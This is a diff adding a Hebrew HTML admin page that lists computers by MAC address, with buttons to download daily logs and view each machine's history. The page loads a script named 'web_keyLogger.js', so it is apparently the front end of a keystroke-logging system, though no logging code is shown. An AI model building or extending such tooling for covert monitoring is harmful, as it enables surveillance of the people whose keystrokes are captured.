@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>ממשק ניהול — מחשבים לפי MAC</title>
+  <link rel="stylesheet" href="style.css" />
+  <link href="server.py" rel="">
+  <style>
+    
+  </style>
+</head>
+<body>
+  <header>
+    <div class="wrap">
+      <h1>ממשק ניהול — רשימת מחשבים (כולל MAC)</h1>
+    </div>
+  </header>
+
+  <main class="grid">
+    <!-- עמודה ימנית: רשימת מחשבים -->
+    <section class="card" aria-label="רשימת מחשבים">
+      <div class="toolbar">
+        <div class="search" aria-label="חיפוש מחשב">
+          <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zM4 9.5C4 6.47 6.47 4 9.5 4S15 6.47 15 9.5 12.53 15 9.5 15 4 12.53 4 9.5"/></svg>
+          <input id="q" type="search" placeholder="חיפוש לפי שם/תג/מיקום/‏MAC" />
+        </div>
+      </div>
+
+      <ul id="deviceList" class="devices" role="listbox" aria-label="מכשירים">
+        <!-- ימולא דינמית -->
+      </ul>
+      <p class="hint" style="margin-top:10px;">לחיצה תסמן את המחשב הנבחר לפעולות בעמודה השמאלית.</p>
+    </section>
+
+    <!-- עמודה שמאלית: פעולות -->
+    <section class="card" aria-label="פעולות">
+      <h3 class="section-title">פעולות כלליות</h3>
+      <div class="actions" style="margin-bottom:16px;">
+        <button class="btn primary" id="btnDownloadAll">הורדה — כל היומנים היומיים</button>
+        <button class="btn" id="btnAddDevice">הוספת מחשב</button>
+      </div>
+
+      <h3 class="section-title">פעולות על מחשב נבחר</h3>
+      <p class="hint">מחשב נבחר: <strong id="selName">—</strong></p>
+      <div class="actions">
+        <button class="btn" id="btnHistory" disabled>צפייה בהיסטוריה</button>
+        <button class="btn ghost" id="btnMore" disabled>עוד אפשרויות</button>
+      </div>
+
+      <div id="panel" class="panel">בחרי מחשב כדי לראות היסטוריה או לשנות הגדרות.</div>
+    </section>
+  </main>
+
+  <!-- מודאל: הוספת/עריכת מחשב -->
+  <dialog id="deviceModal">
+    <form method="dialog" class="modal" id="deviceForm">
+      <h3 id="deviceModalTitle">הוספת מחשב</h3>
+      <div class="form-row">
+        <label>שם מחשב</label>
+        <input class="input" id="mName" required placeholder="למשל: PC-01" />
+      </div>
+      <div class="form-row">
+        <label>MAC Address</label>
+        <input class="input" id="mMac" required placeholder="AA:BB:CC:DD:EE:FF" />
+        <small class="hint">נקלט בכל פורמט (עם/בלי מקפים/נקודות) — ינורמל אוטומטית.</small>
+      </div>
+      <div class="form-row">
+        <label>מיקום (אופציונלי)</label>
+        <input class="input" id="mLocation" placeholder="למשל: חדר עבודה" />
+      </div>
+      <div class="form-row">
+        <label>תגיות (מופרדות בפסיק)</label>
+        <input class="input" id="mTags" placeholder="דסקטופ, אימון" />
+      </div>
+      <div class="form-row">
+        <label>מצב</label>
+        <select class="select" id="mOnline">
+          <option value="true">מחובר (ירוק)</option>
+          <option value="false">מנותק (אדום)</option>
+        </select>
+      </div>
+      <div class="footer">
+        <div class="hint">טיפ: <span class="kbd">Esc</span> לסגירה מהירה</div>
+        <div class="actions">
+          <button class="btn" value="cancel">ביטול</button>
+          <button class="btn primary" id="mSubmit" value="default">שמירה</button>
+        </div>
+      </div>
+    </form>
+  </dialog>
+
+  <!-- מודאל: עוד אפשרויות -->
+  <dialog id="moreModal">
+    <form method="dialog" class="modal">
+      <h3>עוד אפשרויות</h3>
+      <div class="actions">
+        <button class="btn" id="toggleOnlineBtn" value="toggle">טוגל אונליין/אופליין</button>
+        <button class="btn" id="renameBtn" value="rename">שינוי שם</button>
+        <button class="btn" id="changeMacBtn" value="changeMac">שינוי MAC</button>
+        <button class="btn" id="retagBtn" value="retag">עדכון תגיות/מיקום</button>
+        <button class="btn" id="deleteBtn" value="delete" style="background:#fee2e2;border-color:#fecaca;">מחיקה</button>
+      </div>
+      <div class="footer" style="margin-top:10px;">
+        <div class="hint">פעולות אלו ישפיעו על המחשב הנבחר בלבד.</div>
+        <button class="btn" value="cancel">סגור</button>
+      </div>
+    </form>
+  </dialog>
+
+  <script src="web_keyLogger.js">
+   
+  </script>
+</body>
+</html>
